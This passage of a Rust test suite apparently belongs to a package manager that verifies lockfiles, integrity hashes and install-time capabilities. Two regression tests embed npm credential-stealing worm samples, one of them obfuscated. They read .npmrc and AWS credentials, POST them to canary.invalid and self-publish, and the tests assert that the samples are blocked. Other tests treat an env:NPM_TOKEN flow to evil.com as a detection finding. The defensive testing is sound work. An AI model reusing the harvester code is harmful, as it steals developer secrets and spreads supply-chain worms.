        "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1".to_owned(),
    );
    let spec = PackageSpec::parse("npm:left-pad@^1.0.0").unwrap();
    let resolved = resolve_npm_lockfile_tarball(&spec, "left-pad", Some("^1.0.0"), &options)
        .unwrap()
        .unwrap();

    assert!(resolved.npm_direct_tarball);
    assert_eq!(
        resolved.source_url,
        "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1"
    );
    assert_eq!(resolved.version, "1.3.0");
}

#[test]
fn resolves_npm_offline_from_cached_omc_lock() {
    let dir = tempfile::tempdir().unwrap();
    let archive_bytes = b"cached npm archive";
    let mut locked = locked_package_for_test(Ecosystem::Npm, "offline-pkg", "1.0.0");
    locked.archive = ".omc/cache/npm/offline-pkg/1.0.0/offline-pkg.tgz".to_owned();
    locked.sha256 = sha256_hex(archive_bytes);
    let archive_path = dir.path().join(&locked.archive);
    fs::create_dir_all(archive_path.parent().unwrap()).unwrap();
    fs::write(&archive_path, archive_bytes).unwrap();
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: vec![locked.clone()],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        })
        .unwrap(),
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.npm_offline = true;
    let spec = PackageSpec::parse("npm:offline-pkg@^1.0.0").unwrap();
    let resolved =
        resolve_npm_offline_locked_package(&spec, "offline-pkg", Some("^1.0.0"), &options)
            .unwrap()
            .unwrap();

    assert!(resolved.npm_direct_tarball);
    assert_eq!(resolved.version, "1.0.0");
    assert_eq!(
        resolved.expected_sha256.as_deref(),
        Some(locked.sha256.as_str())
    );
    assert_eq!(resolved.local_path.as_deref(), Some(archive_path.as_path()));
}

#[test]
fn rejects_npm_offline_when_locked_archive_is_missing() {
    let dir = tempfile::tempdir().unwrap();
    let locked = locked_package_for_test(Ecosystem::Npm, "offline-pkg", "1.0.0");
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: vec![locked],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        })
        .unwrap(),
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options.npm_offline = true;
    let spec = PackageSpec::parse("npm:offline-pkg@^1.0.0").unwrap();
    let error = resolve_npm_offline_locked_package(&spec, "offline-pkg", Some("^1.0.0"), &options)
        .unwrap_err();

    assert!(error
        .to_string()
        .contains("npm --offline requires cached archive"));
}

#[test]
fn extracts_npm_manifest_from_tgz() {
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "node install.js" },
                "dependencies": { "runtime": "^1.0.0" },
                "peerDependencies": { "peer": "^2.0.0" }
            }"#,
    );

    let manifest = npm_manifest_from_tgz(&bytes).unwrap();
    assert_eq!(manifest.version, "1.0.0");
    assert_eq!(
        manifest
            .scripts
            .as_ref()
            .and_then(|scripts| scripts.get("postinstall"))
            .map(String::as_str),
        Some("node install.js")
    );
    let dependencies = npm_manifest_runtime_dependencies(&manifest);
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "runtime"));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "peer"));
}

#[test]
fn verifies_npm_integrity_hashes() {
    let bytes = b"artifact";
    assert!(verify_npm_integrity(
            "demo",
            "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ==",
            bytes,
        )
        .is_ok());
    assert!(verify_npm_integrity("demo", "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=", bytes).is_ok());

    let error = verify_npm_integrity("demo", "sha512-AAAA", bytes).unwrap_err();
    assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

    let error = verify_npm_integrity("demo", "md5-AAAA", bytes).unwrap_err();
    assert!(error
        .to_string()
        .contains("unsupported npm integrity digest"));
}

#[test]
fn prunes_lockfile_to_retained_packages() {
    let dir = tempfile::tempdir().unwrap();
    let keep = locked_package_for_test(Ecosystem::Npm, "left-pad", "1.3.0");
    let stale = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: vec![keep.clone(), stale],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        })
        .unwrap(),
    )
    .unwrap();

    let removed = prune_lockfile(dir.path(), &BTreeSet::from([locked_package_key(&keep)])).unwrap();

    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(removed, 1);
    assert_eq!(lock.packages.len(), 1);
    assert_eq!(lock.packages[0].name, "left-pad");
}

#[test]
fn prunes_replaced_locked_versions_by_package_name() {
    let dir = tempfile::tempdir().unwrap();
    let keep_npm = locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.3");
    let stale_npm = locked_package_for_test(Ecosystem::Npm, "left-pad", "1.3.0");
    let keep_pypi = locked_package_for_test(Ecosystem::Pypi, "idna", "3.16");
    let stale_pypi = locked_package_for_test(Ecosystem::Pypi, "IDNA", "3.7");
    let unrelated = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: vec![
                keep_npm.clone(),
                stale_npm,
                keep_pypi.clone(),
                stale_pypi,
                unrelated.clone(),
            ],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        })
        .unwrap(),
    )
    .unwrap();

    let removed =
        prune_locked_package_versions(dir.path(), &[keep_npm.clone(), keep_pypi.clone()]).unwrap();

    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(
        removed,
        vec!["npm:left-pad@1.3.0".to_owned(), "pypi:IDNA@3.7".to_owned()]
    );
    assert_eq!(
        lock.packages
            .iter()
            .map(locked_package_key)
            .collect::<Vec<_>>(),
        vec![
            locked_package_key(&keep_npm),
            locked_package_key(&keep_pypi),
            locked_package_key(&unrelated),
        ]
    );
}

#[test]
fn removes_locked_packages_by_requested_spec() {
    let dir = tempfile::tempdir().unwrap();
    let keep = locked_package_for_test(Ecosystem::Pypi, "idna", "3.7");
    let remove = locked_package_for_test(Ecosystem::Pypi, "Requests", "2.32.3");
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: vec![keep, remove],
            local_sources: Vec::new(),
            python_vcs: vec![LockedPythonVcsDependency {
                name: "requests".to_owned(),
                url: "https://example.invalid/requests.git".to_owned(),
                reference: None,
                resolved_commit: "0123456789abcdef0123456789abcdef01234567".to_owned(),
                archive: String::new(),
                sha256: String::new(),
                subdirectory: None,
                extras: Vec::new(),
            }],
        })
        .unwrap(),
    )
    .unwrap();

    let removed =
        remove_locked_packages(dir.path(), &[PackageSpec::parse("pypi:requests").unwrap()])
            .unwrap();

    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(removed, vec!["pypi:Requests@2.32.3".to_owned()]);
    assert_eq!(lock.packages.len(), 1);
    assert_eq!(lock.packages[0].name, "idna");
    assert!(lock.python_vcs.is_empty());
}

#[test]
fn removes_python_vcs_lock_without_regular_package() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock {
            version: 1,
            signing_key: None,
            packages: Vec::new(),
            local_sources: Vec::new(),
            python_vcs: vec![LockedPythonVcsDependency {
                name: "gitpkg".to_owned(),
                url: "https://example.invalid/gitpkg.git".to_owned(),
                reference: Some("main".to_owned()),
                resolved_commit: "0123456789abcdef0123456789abcdef01234567".to_owned(),
                archive: String::new(),
                sha256: String::new(),
                subdirectory: None,
                extras: Vec::new(),
            }],
        })
        .unwrap(),
    )
    .unwrap();

    let removed =
        remove_locked_packages(dir.path(), &[PackageSpec::parse("pypi:gitpkg").unwrap()]).unwrap();

    let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
    assert_eq!(removed, vec!["pypi:gitpkg".to_owned()]);
    assert!(lock.packages.is_empty());
    assert!(lock.python_vcs.is_empty());
}

#[test]
fn checks_pypi_lock_dependencies() {
    let mut root = locked_package_for_test(Ecosystem::Pypi, "root", "1.0.0");
    root.dependencies = vec!["pypi:dep>=2".to_owned(), "pypi:missing>=1".to_owned()];
    let dep = locked_package_for_test(Ecosystem::Pypi, "dep", "1.5.0");
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root, dep],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };

    assert_eq!(
        check_pypi_lock(&lock),
        vec![
            PypiCheckIssue::Incompatible {
                package: "root".to_owned(),
                version: "1.0.0".to_owned(),
                requirement: "dep>=2".to_owned(),
                installed_name: "dep".to_owned(),
                installed_version: "1.5.0".to_owned(),
            },
            PypiCheckIssue::Missing {
                package: "root".to_owned(),
                version: "1.0.0".to_owned(),
                requirement: "missing>=1".to_owned(),
            },
        ]
    );

    let mut root = locked_package_for_test(Ecosystem::Pypi, "root", "1.0.0");
    root.dependencies = vec!["pypi:dep>=1".to_owned()];
    let dep = locked_package_for_test(Ecosystem::Pypi, "dep", "1.5.0");
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root, dep],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    assert!(check_pypi_lock(&lock).is_empty());
}

#[test]
fn locked_archive_reader_rejects_tampered_cache() {
    let dir = tempfile::tempdir().unwrap();
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, b"tampered").unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = ".omc/cache/npm/pkg.tgz".to_owned();
    package.sha256 = sha256_hex(b"expected");

    let error = read_locked_archive(dir.path(), &package).unwrap_err();
    assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

    package.sha256 = sha256_hex(b"tampered");
    assert_eq!(
        read_locked_archive(dir.path(), &package).unwrap(),
        b"tampered"
    );
}

#[test]
fn installs_npm_tarballs_with_root_directory_entries() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let node_modules = dir.path().join("node_modules");
    let target = install_npm_package_to(dir.path(), &package, &node_modules).unwrap();
    assert!(target.join("package.json").exists());
}

#[test]
fn reads_npm_entry_source_from_locked_archive() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_with_files(
        r#"{"name":"is-odd","version":"3.0.1","main":"lib/main.js"}"#,
        &[(
            "lib/main.js",
            "module.exports = function isOdd(n){return n%2===1;};",
        )],
    );
    let archive = dir.path().join(".omc/cache/npm/is-odd.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let entry = read_locked_package_entry_source(dir.path(), &package).unwrap();
    assert_eq!(entry.module_id, "npm:is-odd@3.0.1");
    assert!(entry.source.contains("isOdd"));
}

#[test]
fn npm_entry_source_defaults_to_index_js() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_with_files(
        r#"{"name":"pkg","version":"1.0.0"}"#,
        &[("index.js", "module.exports = function f(){return 1;};")],
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let entry = read_locked_package_entry_source(dir.path(), &package).unwrap();
    assert!(entry.source.contains("function f"));
}

#[test]
fn reads_pypi_entry_source_from_init_py() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = python_sdist_for_test(&[("mathy/__init__.py", "def main(n):\n    return n+1\n")]);
    let archive = dir.path().join(".omc/cache/pypi/mathy.tar.gz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Pypi, "mathy", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let entry = read_locked_package_entry_source(dir.path(), &package).unwrap();
    assert_eq!(entry.module_id, "pypi:mathy@1.0.0");
    assert!(entry.source.contains("def main"));
}

#[test]
fn missing_entry_source_fails_closed() {
    let dir = tempfile::tempdir().unwrap();
    // An npm archive whose package.json points at a file that is absent.
    let bytes = npm_tgz_with_files(
        r#"{"name":"pkg","version":"1.0.0","main":"missing.js"}"#,
        &[("other.js", "module.exports = 1;")],
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let err = read_locked_package_entry_source(dir.path(), &package).unwrap_err();
    assert!(
        matches!(err, OmcRegistryError::MissingEntrySource(_)),
        "got {err:?}"
    );
}

fn npm_tgz_with_files(package_json: &str, files: &[(&str, &str)]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(package_json.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(&mut header, "package/package.json", package_json.as_bytes())
            .unwrap();
        for (path, content) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(&mut header, format!("package/{path}"), content.as_bytes())
                .unwrap();
        }
        archive.into_inner().unwrap().finish().unwrap();
    }
    bytes
}

// Verify a package archive through the SAME gate `omc add` uses: profile the
// tarball, reconstruct the module, and verify it under the MOST PERMISSIVE
// install posture (public defaults + the benign-runtime-cap demotion from
// Part 2). If it still blocks here, it blocks for every real project.
fn install_verdict_for_worm(package: &ResolvedPackage, bytes: &[u8]) -> (Verdict, ArchiveProfile) {
    let profile = profile_archive(package, bytes).unwrap();
    let module = module_from_profile(package, &profile.capabilities);
    let policy = allow_benign_runtime_capabilities(
        default_public_capabilities()
            .into_iter()
            .fold(Policy::pure(), Policy::allow_capability),
    );
    let verdict = if verify_module(&module, &policy).is_ok() {
        Verdict::Accepted
    } else {
        Verdict::Blocked
    };
    (verdict, profile)
}

fn worm_resolved_package(name: &str) -> ResolvedPackage {
    let mut npm_scripts = BTreeMap::new();
    // The Shai-Hulud vector: a postinstall hook that runs the harvester the
    // moment the package lands — code OMC never executes.
    npm_scripts.insert("postinstall".to_owned(), "node harvest.js".to_owned());
    ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: name.to_owned(),
        version: "1.0.0".to_owned(),
        source_url: format!("https://example.invalid/{name}.tgz"),
        download_url: None,
        local_path: None,
        filename: format!("{name}-1.0.0.tgz"),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts,
        platform_compatible: true,
        dependencies: Vec::new(),
    }
}

// REGRESSION: a Shai-Hulud-class npm worm — postinstall harvester that reads
// credentials and exfiltrates them to a canary, then "republishes" itself with
// a stolen token — must be BLOCKED at install. Uses canary.invalid (no real
// host) and fake credential paths; OMC never runs any of this code.
#[test]
fn shai_hulud_worm_is_blocked_at_install() {
    // The harvester the postinstall hook would run: grab the npm token + cloud
    // creds + env, POST them to a webhook, then republish via the stolen token.
    let harvester = "const fs = require('fs');\n\
             const cp = require('child_process');\n\
             const token = fs.readFileSync('/home/runner/.npmrc', 'utf8');\n\
             const aws = fs.readFileSync('/home/runner/.aws/credentials', 'utf8');\n\
             const env = JSON.stringify(process.env);\n\
             fetch('https://canary.invalid/collect', { method: 'POST', body: token + aws + env });\n\
             cp.execSync('npm publish --access public');\n";
    let bytes = npm_tgz_with_files(
        r#"{"name":"shai-hulud","version":"1.0.0","scripts":{"postinstall":"node harvest.js"}}"#,
        &[("harvest.js", harvester)],
    );
    let package = worm_resolved_package("shai-hulud");

    let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
    assert_eq!(
        verdict,
        Verdict::Blocked,
        "a Shai-Hulud-class postinstall credential worm must be blocked at install; caps {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::ProcSpawn && c.target.starts_with("npm-script:")),
        "the postinstall lifecycle hook must surface as a ProcSpawn capability; caps {:?}",
        profile.capabilities
    );
}

// REGRESSION: the obfuscated variant — string-built capability roots so static
// triggers don't appear literally — must ALSO fail closed (DynamicEval), not
// sneak through as Pure/Accepted.
#[test]
fn obfuscated_shai_hulud_worm_is_blocked_at_install() {
    let harvester = "const p = process['en'+'v'];\n\
             const send = globalThis['fet'+'ch'];\n\
             const run = new Function('return require')()('child_process');\n\
             send('https://canary.invalid/c', { method: 'POST', body: JSON.stringify(p) });\n\
             run.execSync('npm publish');\n";
    let bytes = npm_tgz_with_files(
        r#"{"name":"shai-hulud-obf","version":"1.0.0"}"#,
        &[("index.js", harvester)],
    );
    // No declared lifecycle script here: the obfuscation itself must be enough
    // to fail closed, so the worm can't dodge the gate by hiding its trigger.
    let mut package = worm_resolved_package("shai-hulud-obf");
    package.npm_scripts = BTreeMap::new();

    let (verdict, profile) = install_verdict_for_worm(&package, &bytes);
    assert_eq!(
        verdict,
        Verdict::Blocked,
        "an obfuscated credential worm must fail closed at install; caps {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|c| c.kind == CapabilityKind::DynamicEval),
        "opaque capability-root access must emit a DynamicEval capability; caps {:?}",
        profile.capabilities
    );
}

// The shipped recommended global config must stay parseable by the REAL
// global-config path (which, unlike a project manifest, has no `[project]`)
// and keep its documented freshness floor, so examples/omc.global.toml can't
// drift from the schema or regress to requiring a project block.
#[test]
fn shipped_global_config_example_parses() {
    let raw = include_str!("../../../examples/omc.global.toml");
    let config: GlobalConfig =
        toml::from_str(raw).expect("policy-only global config must parse without [project]");
    assert_eq!(
        config.policy.min_release_age.as_deref(),
        Some("14d"),
        "the recommended global config must keep its 14d freshness floor"
    );
    assert_eq!(
        parse_min_release_age(config.policy.min_release_age.as_deref()).unwrap(),
        Some(14 * 24 * 60 * 60),
        "the documented floor must compile to 14 days of seconds"
    );
}

// End-to-end: dropping the shipped example at $OMC_HOME/omc.toml must load as a
// global baseline (no `[project]` required) and surface its freshness floor.
#[test]
fn shipped_global_config_loads_from_omc_home() {
    let raw = include_str!("../../../examples/omc.global.toml");
    let home = tempfile::tempdir().unwrap();
    fs::write(home.path().join("omc.toml"), raw).unwrap();

    let global = {
        let _guard = OMC_HOME_ENV_LOCK.lock().unwrap();
        env::set_var("OMC_HOME", home.path());
        let loaded = load_global_manifest();
        env::remove_var("OMC_HOME");
        loaded
    }
    .unwrap()
    .expect("global config present at $OMC_HOME must load");
    assert_eq!(global.policy.min_release_age.as_deref(), Some("14d"));
}

// A pinned trust block grants ONLY its exact package + version — never a
// different version, never another package. (Pure pin semantics, no env.)
#[test]
fn pinned_trust_block_grants_only_matching_version() {
    let doc = omc_policy::parse("npm package \"widget\" ==1.0.0 { allow eval }").unwrap();
    let hit = doc.compile_for(omc_policy::Ecosystem::Npm, "widget", "1.0.0");
    let miss_ver = doc.compile_for(omc_policy::Ecosystem::Npm, "widget", "2.0.0");
    let miss_pkg = doc.compile_for(omc_policy::Ecosystem::Npm, "gadget", "1.0.0");
    assert!(hit.allowed_capabilities.contains(&Capability::DynamicEval));
    assert!(!miss_ver
        .allowed_capabilities
        .contains(&Capability::DynamicEval));
    assert!(!miss_pkg
        .allowed_capabilities
        .contains(&Capability::DynamicEval));
}

// End-to-end: `omc trust` writes a per-package pinned block to
// $OMC_HOME/policy.d/, the loader picks it up, and effective_package_policy
// grants it for that exact package+version — but NOT a different version.
#[test]
fn global_trust_roundtrips_through_policy_d() {
    let home = tempfile::tempdir().unwrap();
    let (granted, other_version, file_ok) = {
        let _guard = OMC_HOME_ENV_LOCK.lock().unwrap();
        env::set_var("OMC_HOME", home.path());
        let path = write_global_package_trust(
            Ecosystem::Pypi,
            "requests",
            "2.32.5",
            &["dynamic.eval".to_owned()],
            &["env:*->network:*".to_owned()],
        )
        .unwrap();
        let file_ok = path.exists()
            && omc_policy::parse(&fs::read_to_string(&path).unwrap()).is_ok()
            && fs::read_to_string(&path).unwrap().contains("==2.32.5");
        let granted = effective_package_policy(
            home.path(),
            Policy::pure(),
            Ecosystem::Pypi,
            "requests",
            "2.32.5",
        )
        .unwrap();
        let other_version = effective_package_policy(
            home.path(),
            Policy::pure(),
            Ecosystem::Pypi,
            "requests",
            "2.30.0",
        )
        .unwrap();
        env::remove_var("OMC_HOME");
        (granted, other_version, file_ok)
    };
    assert!(file_ok, "trust file must exist, parse, and pin the version");
    assert!(
        granted
            .allowed_capabilities
            .contains(&Capability::DynamicEval),
        "trusted version must receive the grant"
    );
    assert!(
        !granted.allowed_flows.is_empty(),
        "trusted version must receive the flow grant"
    );
    assert!(
        !other_version
            .allowed_capabilities
            .contains(&Capability::DynamicEval),
        "an untrusted version must NOT inherit the grant"
    );
}

// REGRESSION: a packument must still deserialize when ANY version uses a
// legacy `engines` shape — an array (early lodash: ["node","rhino"]) or a bare
// string (early qs: ">=0.10.40"). Before the lenient parser these failed the
// whole `.json::<NpmRoot>()` decode ("error decoding response body"), making
// lodash and qs — two of the most-downloaded npm packages — uninstallable.
#[test]
fn npm_packument_tolerates_legacy_engines_shapes() {
    let body = r#"{
            "dist-tags": { "latest": "3.0.0" },
            "versions": {
                "0.1.0": {
                    "version": "0.1.0",
                    "engines": ["node", "rhino"],
                    "dist": { "tarball": "https://r/lodash-0.1.0.tgz" }
                },
                "5.1.0": {
                    "version": "5.1.0",
                    "engines": ">=0.10.40",
                    "dist": { "tarball": "https://r/qs-5.1.0.tgz" }
                },
                "3.0.0": {
                    "version": "3.0.0",
                    "engines": { "node": ">=18" },
                    "dist": { "tarball": "https://r/pkg-3.0.0.tgz" }
                }
            }
        }"#;
    let root: NpmRoot = serde_json::from_str(body).expect("legacy engines must not fail decode");
    assert_eq!(root.dist_tags.latest, "3.0.0");
    // Legacy array/string forms parse as "no constraint"; the object form is kept.
    assert!(root.versions["0.1.0"].engines.is_none());
    assert!(root.versions["5.1.0"].engines.is_none());
    assert_eq!(
        root.versions["3.0.0"].engines.as_ref().unwrap()["node"],
        ">=18"
    );
}

#[test]
fn block_guidance_maps_flow_finding_to_minimal_grant() {
    let need =
        parse_block_finding("send[8]: env:NPM_TOKEN may not flow to network:evil.com").unwrap();
    assert!(need.dangerous);
    assert_eq!(
        need.cli_flag,
        "--allow-flow env:NPM_TOKEN->network:evil.com"
    );
    assert_eq!(
        need.policy_stmt,
        "flow env \"NPM_TOKEN\" -> net \"evil.com\""
    );
    assert!(
        need.raw
            .contains("env:NPM_TOKEN may not flow to network:evil.com"),
        "raw machine token must be preserved verbatim"
    );
    assert!(need.risk.is_some(), "secret->sink must carry a risk line");
}

#[test]
fn block_guidance_maps_capability_findings() {
    for (finding, flag, stmt, dangerous) in [
        (
            "p[3]: capability dynamic.eval not granted",
            "--allow dynamic.eval",
            "allow eval",
            true,
        ),
        (
            "p[0]: capability proc.spawn:* not granted",
            "--allow proc.spawn:*",
            "allow spawn \"*\"",
            true,
        ),
        (
            "p[0]: capability fs.write:* not granted",
            "--allow fs.write:*",
            "allow write \"*\"",
            true,
        ),
        (
            "p[1]: capability env.read:TOKEN not granted",
            "--allow env.read:TOKEN",
            "allow env \"TOKEN\"",
            false,
        ),
    ] {
        let need = parse_block_finding(finding).unwrap();
        assert_eq!(need.cli_flag, flag, "{finding}");
        assert_eq!(need.policy_stmt, stmt, "{finding}");
        assert_eq!(need.dangerous, dangerous, "{finding}");
    }
}

// The rendered `omc.policy` block must actually PARSE with the real DSL parser
// and pin the exact version — guards against grammar drift (the `=` vs `==`
// bug class) so a copy-pasted suggestion is never a parse error.
#[test]
fn rendered_policy_block_parses_and_pins_version() {
    let findings = vec![
        "main[1]: env:NPM_TOKEN may not flow to network:evil.com".to_owned(),
        "main[3]: capability dynamic.eval not granted".to_owned(),
        "main[4]: capability proc.spawn:npm-script:postinstall not granted".to_owned(),
    ];
    let g = render_block_guidance(Ecosystem::Npm, "shady", "1.2.3", &findings);
    // raw tokens always shown; one-run command present.
    assert!(g.contains("env:NPM_TOKEN may not flow to network:evil.com"));
    assert!(g.contains("omc add npm:shady@1.2.3"));
    assert!(g.contains("--allow-flow env:NPM_TOKEN->network:evil.com"));

    // Extract the omc.policy block and parse it with the real parser.
    let start = g.find("npm package").expect("policy block present");
    let block = &g[start..];
    let block = &block[..=block.rfind('}').unwrap()];
    assert!(block.contains("==1.2.3"), "version must be pinned with ==");
    omc_policy::parse(block).expect("rendered policy block must parse cleanly");
}

#[test]
fn locked_reachable_packages_include_transitive_dependencies() {
    let mut root = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
    root.dependencies = vec!["npm:is-number@^6.0.0".to_owned()];
    let dependency = locked_package_for_test(Ecosystem::Npm, "is-number", "6.0.0");
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root, dependency],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let options = LinkOptions::new(".");
    let retained = locked_reachable_package_keys(
        &lock,
        &[PackageSpec::parse("npm:is-odd@^3.0.0").unwrap()],
        &options,
    )
    .unwrap();

    assert!(retained.contains("npm:is-odd@3.0.1"));
    assert!(retained.contains("npm:is-number@6.0.0"));
}

#[test]
fn locked_reachable_packages_respect_pypi_no_deps() {
    let mut root = locked_package_for_test(Ecosystem::Pypi, "requests", "2.32.3");
    root.dependencies = vec!["pypi:idna>=3".to_owned()];
    let dependency = locked_package_for_test(Ecosystem::Pypi, "idna", "3.7");
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root, dependency],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let mut options = LinkOptions::new(".");
    options.pypi_include_dependencies = false;

    let retained = locked_reachable_package_keys(
        &lock,
        &[PackageSpec::parse("pypi:requests==2.32.3").unwrap()],
        &options,
    )
    .unwrap();

    assert!(retained.contains("pypi:requests@2.32.3"));
    assert!(!retained.contains("pypi:idna@3.7"));
}

#[test]
fn locked_reachable_packages_allow_missing_optional_dependencies() {
    let mut root = locked_package_for_test(Ecosystem::Npm, "has-optional", "1.0.0");
    root.optional_dependencies = vec!["npm:optional-platform@1.0.0".to_owned()];
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let options = LinkOptions::new(".");
    let retained = locked_reachable_package_keys(
        &lock,
        &[PackageSpec::parse("npm:has-optional@1.0.0").unwrap()],
        &options,
    )
    .unwrap();

    assert_eq!(
        retained,
        BTreeSet::from(["npm:has-optional@1.0.0".to_owned()])
    );
}

#[test]
fn locked_reachable_packages_respect_optional_and_peer_omits() {
    let mut root = locked_package_for_test(Ecosystem::Npm, "root", "1.0.0");
    root.dependencies = vec!["npm:runtime@1.0.0".to_owned()];
    root.optional_dependencies = vec!["npm:optional-runtime@1.0.0".to_owned()];
    root.peer_dependencies = vec!["npm:peer-runtime@1.0.0".to_owned()];
    let runtime = locked_package_for_test(Ecosystem::Npm, "runtime", "1.0.0");
    let optional = locked_package_for_test(Ecosystem::Npm, "optional-runtime", "1.0.0");
    let peer = locked_package_for_test(Ecosystem::Npm, "peer-runtime", "1.0.0");
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![root, runtime, optional, peer],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let mut options = LinkOptions::new(".");
    options.include_optional_dependencies = false;
    options.include_peer_dependencies = false;

    let retained = locked_reachable_package_keys(
        &lock,
        &[PackageSpec::parse("npm:root@1.0.0").unwrap()],
        &options,
    )
    .unwrap();

    assert!(retained.contains("npm:root@1.0.0"));
    assert!(retained.contains("npm:runtime@1.0.0"));
    assert!(!retained.contains("npm:optional-runtime@1.0.0"));
    assert!(!retained.contains("npm:peer-runtime@1.0.0"));
}

#[test]
fn locked_reachable_packages_reject_stale_lockfiles() {
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.0")],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let options = LinkOptions::new(".");
    let error = locked_reachable_package_keys(
        &lock,
        &[PackageSpec::parse("npm:left-pad@1.3.0").unwrap()],
        &options,
    )
    .unwrap_err();

    assert!(matches!(error, OmcRegistryError::LockfileOutOfDate(_)));
}

#[test]
fn discovers_package_lock_constraints() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
